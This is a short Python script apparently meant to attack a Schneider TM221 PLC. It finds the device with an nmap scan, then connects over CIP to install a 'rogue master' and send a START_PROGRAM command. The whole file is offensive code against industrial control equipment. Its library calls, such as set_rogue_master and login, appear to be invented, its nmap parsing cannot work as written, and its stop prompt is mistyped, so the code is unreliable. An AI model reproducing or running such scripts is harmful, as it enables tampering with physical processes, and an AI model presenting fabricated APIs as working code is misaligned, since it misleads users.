import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def setup_rogue_master(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Set up the rogue master
        rogue_master_ip = '192.168.1.100'  # IP address of the rogue master
        cip_client.set_rogue_master(rogue_master_ip)
        
        # Send a command message to the PLC using the rogue master
        command_message = 'START_PROGRAM'
        cip_client.send_command(command_message)
        
        print(f"Rogue master set up and command message sent to PLC: {command_message}")
    except Exception as e:
        print(f"Failed to set up rogue master: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Set up the rogue master
        setup_rogue_master(plc_ip)
        
        while True:
            user_input = input("Type 'top' to stop rogue master: ")
            if user_input.lower() == 'top':
                break
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()